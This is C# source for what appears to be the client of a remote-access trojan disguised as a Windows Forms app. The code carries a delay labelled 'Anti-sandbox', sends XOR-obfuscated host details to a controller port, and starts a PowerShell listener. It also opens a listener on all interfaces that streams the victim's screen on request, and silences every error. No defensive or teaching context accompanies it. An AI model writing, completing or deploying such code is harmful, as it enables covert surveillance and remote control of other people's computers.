using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace TutClientNet8
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            this.Shown += async (s, e) =>
            {
                await StartClientAsync();
                PowerShellHelper.StartPowerShellListener();
                await StartRemoteDesktopListener();
            };
        }

        private async Task StartClientAsync()
        {
            try
            {
                await Task.Delay(1500); // Anti-sandbox
                string id = Guid.NewGuid().ToString("N").Substring(0, 8);
                string host = Environment.MachineName;
                string time = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
                string ip = GetLocalIP();

                string raw = $"{id}|{host}|{ip}|{time}";
                string payload = CryptoHelper.SimpleXor(raw);

                using (TcpClient client = new TcpClient())
                {
                    await client.ConnectAsync("127.0.0.1", 8080);
                    using (NetworkStream stream = client.GetStream())
                    {
                        byte[] data = Encoding.UTF8.GetBytes(payload);
                        await stream.WriteAsync(data, 0, data.Length);
                    }
                }
            }
            catch { }
        }

        private async Task StartRemoteDesktopListener()
        {
            try
            {
                TcpListener listener = new TcpListener(IPAddress.Any, 8082);
                listener.Start();
                while (true)
                {
                    TcpClient client = await listener.AcceptTcpClientAsync();
                    _ = Task.Run(() => HandleRemoteDesktopClient(client));
                }
            }
            catch { }
        }

        private async Task HandleRemoteDesktopClient(TcpClient client)
        {
            try
            {
                using (NetworkStream stream = client.GetStream())
                {
                    while (client.Connected)
                    {
                        byte[] buffer = new byte[1024];
                        int bytesRead = await stream.ReadAsync(buffer, 0, buffer.Length);
                        string command = Encoding.UTF8.GetString(buffer, 0, bytesRead);

                        if (command == "SCREENSHOT")
                        {
                            using (Bitmap screenshot = CaptureScreen())
                            using (MemoryStream ms = new MemoryStream())
                            {
                                screenshot.Save(ms, ImageFormat.Jpeg);
                                byte[] imageBytes = ms.ToArray();

                                // Send image size
                                byte[] sizeBytes = BitConverter.GetBytes(imageBytes.Length);
                                await stream.WriteAsync(sizeBytes, 0, sizeBytes.Length);

                                // Send image data
                                await stream.WriteAsync(imageBytes, 0, imageBytes.Length);
                            }
                        }
                    }
                }
            }
            catch { }
            finally
            {
                client.Close();
            }
        }

        private Bitmap CaptureScreen()
        {
            Rectangle bounds = Screen.PrimaryScreen.Bounds;
            Bitmap screenshot = new Bitmap(bounds.Width, bounds.Height);
            using (Graphics g = Graphics.FromImage(screenshot))
            {
                g.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size);
            }
            // Resize to a fixed size to ensure consistency
            int targetWidth = 1280;
            int targetHeight = 720;
            Bitmap resized = new Bitmap(targetWidth, targetHeight);
            using (Graphics g = Graphics.FromImage(resized))
            {
                g.DrawImage(screenshot, 0, 0, targetWidth, targetHeight);
            }
            screenshot.Dispose();
            return resized;
        }

        private string GetLocalIP()
        {
            try
            {
                var host = System.Net.Dns.GetHostEntry(System.Net.Dns.GetHostName());
                foreach (var ip in host.AddressList)
                {
                    if (ip.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                    {
                        return ip.ToString();
                    }
                }
            }
            catch { }
            return "127.0.0.1";
        }
    }
}